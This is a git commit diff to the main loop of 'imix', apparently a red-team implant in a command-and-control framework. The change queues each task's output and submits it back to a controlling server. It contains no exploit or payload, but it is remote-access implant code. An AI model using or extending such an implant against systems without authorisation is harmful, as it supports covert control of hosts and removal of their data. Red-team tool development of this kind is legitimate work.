731bdc0a87e7e326c070dc8da595f24da79cf63d
Hulto <7121375+hulto@users.noreply.github.com>
2023-10-16 01:01:29 +0000

    Add task res maps to track output.

--- implants/imix/src/main.rs
+++ implants/imix/src/main.rs
@@ -181,6 +181,9 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
 
     // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
     let mut all_exec_futures: HashMap<String,  ExecTask> = HashMap::new();
+    // This hashmap tracks all tasks output
+    let mut all_task_res_map: HashMap<String, Vec<SubmitTaskResultInput>> = HashMap::new();
+
 
     let principal = match get_principal() {
         Ok(username) => username,
@@ -252,8 +255,6 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         host_primary_ip: primary_ip,
     };
 
-    let mut task_res_map: HashMap<String, Vec<String>> = HashMap::new();
-
     loop {
         let start_time = Utc::now().time();
         // 0. Get loop start time
@@ -311,6 +312,7 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
 
         // :clap: :clap: make new map!
         let mut running_exec_futures: HashMap<String, ExecTask> = HashMap::new();
+        let mut running_task_res_map: HashMap<String, Vec<SubmitTaskResultInput>> = all_task_res_map.clone();
 
         if debug { println!("[{}]: Checking task status", (Utc::now().time() - start_time).num_milliseconds()); }
         // Check status & send response
@@ -319,13 +321,13 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
             if debug { println!("[{}]: Task # {} is_finished? {}", (Utc::now().time() - start_time).num_milliseconds(), task_id, exec_future.1.future_join_handle.is_finished()); }
 
             // If the task doesn't exist in the map add a vector for it.
-            if !task_res_map.contains_key(&task_id) {
-                task_res_map.insert(task_id.clone(), vec![]);
+            if !running_task_res_map.contains_key(&task_id) {
+                running_task_res_map.insert(task_id.clone(), vec![]);
             }
-            // Grab the current contents of this tasks output
-            let mut cur_res: Vec<String> = task_res_map.get(&task_id).context("Error retrieving task ID")?.clone();
 
-            // Loop over each line of output from the task.
+            let mut task_channel_output: Vec<String> = vec![];
+
+            // Loop over each line of output from the task and append it the the channel output.
             loop {
                 if debug { println!("[{}]: Task # {} recieving output", (Utc::now().time() - start_time).num_milliseconds(), task_id); }
                 let new_res_line =  match exec_future.1.print_reciever.recv_timeout(Duration::from_millis(100)) {
@@ -342,45 +344,53 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
                     },
                 };
                 // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
-                cur_res.push(new_res_line)
-
-                // Send task response
+                task_channel_output.push(new_res_line);
             }
-            //  Overwrite and update the tasks output
-            task_res_map.insert(task_id.clone(), cur_res).context("Error updating task results")?;
-            
+
             let task_is_finished = exec_future.1.future_join_handle.is_finished();
             let task_response_exec_finished_at = match task_is_finished {
                 true => Some(Utc::now()),
                 false => None,
             };
-            // If the task is finished or there's new data send a task_result.
-            if task_is_finished ||  task_res_map.get(&task_id).context("Error retrieving task ID")?.len() > 0 {
+        
+            // If the task is finished or there's new data queue a new task result.
+            if task_is_finished ||  task_channel_output.len() > 0 {
                 let task_response = SubmitTaskResultInput {
                     task_id: exec_future.1.graphql_task.id.clone(),
                     exec_started_at: exec_future.1.start_time,
                     exec_finished_at: task_response_exec_finished_at,
-                    output:  task_res_map.get(&task_id).context("Error retrieving task ID")?.join("\n"),
+                    output:  task_channel_output.join("\n"),
                     error: None,
                 };
-                let res = tavern_client.submit_task_result(task_response).await;
-                let _submit_task_result = match res {
-                    Ok(local_val) => {
-                        task_res_map.insert(task_id.clone(), [].to_vec()).context("Error updating task results")?;
-                        local_val
-                    },
-                    Err(local_err) => if debug { println!("Failed to submit task resluts:\n{}", local_err.to_string()) },
-                };
+                let mut tmp_res_list = running_task_res_map.get(&task_id).context("Failed to get task output by ID")?.clone();
+                tmp_res_list.push(task_response);
+                running_task_res_map.insert(task_id.clone(), tmp_res_list);
             }
 
-            // Only re-insert the runnine exec futures
+            // Only re-insert the still running exec futures
             if !exec_future.1.future_join_handle.is_finished() {
                 running_exec_futures.insert(task_id, exec_future.1);
             }
         }
 
+        // Iterate over queued task results and send them back to the server
+        for (task_id, task_res) in running_task_res_map.clone().into_iter() {
+            for task_response in task_res {
+                let res = tavern_client.submit_task_result(task_response).await;
+                let _submit_task_result = match res {
+                    Ok(local_val) => {
+                        running_task_res_map.remove(&task_id);
+                        local_val
+                    },
+                    Err(local_err) => if debug { println!("Failed to submit task resluts:\n{}", local_err.to_string()) },
+                };    
+            }
+            
+        }
+
         // change the reference! This is insane but okay.
         all_exec_futures = running_exec_futures;
+        all_task_res_map = running_task_res_map.clone();
 
         // Debug loop tracker
         if loop_count_max.is_some() {
